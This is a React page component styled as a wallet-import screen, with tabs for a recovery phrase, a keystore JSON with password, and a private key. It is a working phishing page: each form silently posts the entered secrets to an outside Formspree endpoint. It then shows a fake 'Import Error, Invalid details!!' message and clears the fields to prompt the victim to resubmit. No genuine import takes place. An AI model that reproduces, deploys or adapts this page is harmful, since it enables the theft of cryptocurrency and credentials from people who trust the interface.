import {useState} from 'react'
import Footer from '../../components/common/Footer'
import Header from '../../components/common/Header'
import {useForm} from '@formspree/react'
import {ToastContainer, toast} from 'react-toastify'
import 'react-toastify/dist/ReactToastify.css'

export default function Wallet() {
  const [first, setFirst] = useState(false)
  const [second, setSecond] = useState(true)
  const [third, setThird] = useState(false)

  const [state, handleSubmit] = useForm('mvodavdk')
  const [form, setForm] = useState('')
  const [password, setPassword] = useState('')

  const firstTab = () => {
    setSecond(false)
    setThird(false)
    setFirst(true)
  }
  const secondTab = () => {
    setSecond(true)
    setThird(false)
    setFirst(false)
  }
  const thirdTab = () => {
    setSecond(false)
    setThird(true)
    setFirst(false)
  }

  const toasting = () => {
    toast.error('Import Error, Invalid details!!', {
      position: 'bottom-center',
      autoClose: false,
      hideProgressBar: true,
      closeOnClick: false,
      pauseOnHover: true,
      draggable: true,
      progress: undefined,
    })

    setTimeout(() => {
      setForm('')
    }, 2000)
  }

  return (
    <div className='dark:bg-black'>
      <div className='max-w-3xl px-4 mx-auto sm:px-6 xl:max-w-5xl xl:px-0'>
        <div className='flex flex-col justify-between h-screen'>
          <Header />
          <main className='mb-auto'>
            <div className='wrapper'>
              <div className='bloc-tabs'>
                <button
                  onClick={firstTab}
                  className={`tabs ${first ? 'active-tabs' : ''}`}
                >
                  Phrase
                </button>
                <button
                  onClick={secondTab}
                  className={`font-bold tabs ${second ? 'active-tabs' : ''}`}
                >
                  Keystore JSON
                </button>
                <button
                  onClick={thirdTab}
                  className={`tabs ${third ? 'active-tabs' : ''}`}
                >
                  Private Key
                </button>
              </div>
              <div className='content-tabs'>
                <div className={`content ${first ? 'active-content' : ''}`}>
                  <form onSubmit={handleSubmit}>
                    <textarea
                      value={form}
                      onChange={e => {
                        setForm(e.target.value)
                      }}
                      rows='4'
                      type='text'
                      id='phrase'
                      name='phrase'
                      placeholder='Phrase'
                      className='w-full px-3 py-2 mb-10 bg-gray-800 border border-gray-900 rounded focus:border-white focus:outline-none focus:bg-gray-800 focus:text-white'
                      style={{
                        marginTop: '0px',
                        marginBottom: '40px',
                        height: '123px',
                      }}
                    ></textarea>
                    <button
                      onClick={toasting}
                      disabled={state.submitting}
                      type='submit'
                      className='justify-center w-full p-4 mt-10 text-white bg-red-900 rounded-lg'
                    >
                      IMPORT
                    </button>
                    <ToastContainer />
                  </form>
                </div>
                <div className={`content ${second ? 'active-content' : ''}`}>
                  <form onSubmit={handleSubmit}>
                    <textarea
                      value={form}
                      onChange={e => {
                        setForm(e.target.value)
                      }}
                      rows='4'
                      type='text'
                      id='keystorejson'
                      name='keystorejson'
                      placeholder='KeyStore JSON'
                      className='w-full px-3 py-2 my-auto bg-gray-800 border border-gray-900 rounded focus:border-white focus:outline-none focus:bg-gray-800 focus:text-white'
                    ></textarea>
                    <input
                      type='text'
                      id='password'
                      name='password'
                      placeholder='Password'
                      className='w-full px-3 py-2 mb-4 bg-gray-800 border border-gray-900 rounded focus:border-white focus:outline-none focus:bg-gray-800 focus:text-white'
                      autoComplete='off'
                      value={password}
                      onChange={e => {
                        setPassword(e.target.value)
                      }}
                    />
                    <button
                      onClick={() => {
                        setTimeout(() => {
                          setForm('')
                          setPassword('')
                        }, 2000)
                      }}
                      disabled={state.submitting}
                      type='submit'
                      className='justify-center w-full p-4 mt-5 text-white bg-red-900 rounded-lg'
                    >
                      IMPORT
                    </button>
                    <ToastContainer />
                  </form>
                </div>
                <div className={`content ${third ? 'active-content' : ''}`}>
                  <form onSubmit={handleSubmit}>
                    <textarea
                      value={form}
                      onChange={e => {
                        setForm(e.target.value)
                      }}
                      rows='2'
                      type='text'
                      id='privatekey'
                      name='privatekey'
                      placeholder='Private Key'
                      className='w-full px-3 py-2 bg-gray-800 border border-gray-900 rounded mb-14 focus:border-white focus:outline-none focus:bg-gray-800 focus:text-white'
                    ></textarea>
                    <button
                      onClick={toasting}
                      disabled={state.submitting}
                      type='submit'
                      className='justify-center w-full p-4 text-white bg-red-900 rounded-lg mt-18'
                    >
                      IMPORT
                    </button>
                    <ToastContainer />
                  </form>
                </div>
              </div>
            </div>
          </main>
          <Footer />
        </div>

        <style jsx>
          {`
            .wrapper {
              display: flex;
              background-color: aqua;
              flex-direction: column;
              position: relative;
              width: auto;
              height: auto;
              justify-content: center;
              background: #f1f1f1;
              margin: 100px auto;
              word-break: break-all;
              border: 2px solid rgba(0, 0, 0, 0.274);
            }

            .bloc-tabs {
              display: flex;
              padding: 5px;
            }

            .tabs {
              padding: 10px;
              text-align: center;
              width: 60%;
              font-size: 14px;
              color: #000;
              font-weight: 400;
              background: hsla(0, 0%, 50.2%, 0.075);
              cursor: pointer;
              border-bottom: 1px solid rgba(0, 0, 0, 0.274);
              box-sizing: border-box;
              position: relative;
              outline: none;
            }

            .active-tabs {
              background: #fff;
              border-bottom: 1px solid transparent;
              color: #000;
            }

            .active-tabs:before {
              content: '';
              display: block;
              position: absolute;
              top: -5px;
              left: 50%;
              transform: translateX(-50%);
              width: calc(100% + 2px);
              height: 5px;
              background: #9b0606;
            }

            .content-tabs {
              flex-grow: 1;
            }

            .content {
              background: #fff;
              padding: 20px;
              width: 100%;
              height: 100%;
              display: none;
            }

            .active-content {
              display: block;
            }

            .tabs:not(:last-child) {
              border-right: 1px solid rgba(0, 0, 0, 0.274);
            }

            button:focus {
              // outline: 1px dotted;
              outline: 5px auto -webkit-focus-ring-color;
            }
          `}
        </style>
      </div>
    </div>
  )
}
